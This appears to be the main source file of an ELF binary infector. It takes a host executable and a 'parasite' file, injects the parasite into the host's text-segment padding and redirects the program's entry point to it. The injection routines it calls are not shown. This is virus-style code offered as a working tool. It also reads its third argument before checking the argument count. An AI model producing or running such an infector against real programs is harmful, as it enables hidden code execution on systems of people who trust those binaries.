#include "elfit.h"

/* currently just a wrapper for posttext inject */
int main(int argc, char *argv[])
{
    unsigned long entry;
    uint32_t patch_position;
    Elfit_t host;

    patch_position = atoi(argv[3]);

    if (argc < 4)
    {
        printf("usage: %s <host> <parasite> <patch_position>\n", argv[0]);
        exit(1);
    }

    /* TODO Integrity check host for section header table */

    load_host(argv[1], &host);

    /* PATCH TO (ENTRY [NULL], X) */
    entry = textpadding_inject(&host, argv[2], patch_position);
    reload_host(argv[1], &host);

    entry_redirect(&host, entry);
}
